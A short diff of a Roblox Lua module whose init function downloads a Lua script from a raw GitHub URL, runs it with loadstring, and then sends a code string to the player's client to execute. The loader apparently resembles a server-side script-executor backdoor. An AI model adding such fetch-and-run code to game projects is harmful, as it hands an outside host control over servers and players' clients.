@@ -4,7 +4,8 @@ local module = {}
 
 function module.init(playere)
     local Player = playere
-	local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/s.lua", true))()
+	local loadstrng = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/s.lua", true)
+	local serverscripts = loadstring(loadstrng)()
 
 	local thecode = [[
 		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
@@ -16,6 +17,7 @@ function module.init(playere)
 	]]
 
     serverscripts.init(playere)
+	task.wait(5)
 	game:GetService("ReplicatedStorage"):FindFirstChild("runclient"):FireClient(playere, thecode, Player)
 end
 
